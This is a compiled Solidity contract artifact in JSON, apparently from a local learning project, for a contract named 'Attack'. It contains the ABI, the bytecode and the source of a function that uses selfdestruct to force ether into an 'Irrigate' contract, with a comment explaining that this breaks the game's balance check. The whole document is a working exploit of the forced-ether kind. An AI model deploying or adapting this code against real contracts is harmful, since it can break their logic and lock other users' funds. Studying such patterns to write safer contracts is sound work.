{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Irrigate",
          "name": "_irrigate",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516101bd3803806101bd8339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b609e8061011f6000396000f3fe608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220f8a9f504d19ccaa28e789f2ca50f4c0ef2d34a0b38b5ea39e89ddbb63e307b8264736f6c63430008040033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\nimport \"./Irrigate.sol\";\r\n\r\ncontract Attack {\r\n    Irrigate irrigate;\r\n\r\n    constructor(Irrigate _irrigate) {\r\n        irrigate = Irrigate(_irrigate);\r\n    }\r\n\r\n    function attack() public payable {\r\n        // You can simply break the game by sending ether so that\r\n        // the game balance >= 7 ether\r\n\r\n        // cast address to payable\r\n        address payable addr = payable(address(irrigate));\r\n        selfdestruct(addr);\r\n    }\r\n}",
  "sourcePath": "C:/Users/rapha/Documents/IT/irrigate-server-erc20-donation/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.4+commit.c7e474f2.Emscripten.clang"
  },
  "schemaVersion": "3.4.0",
  "updatedAt": "2021-05-07T13:25:03.916Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}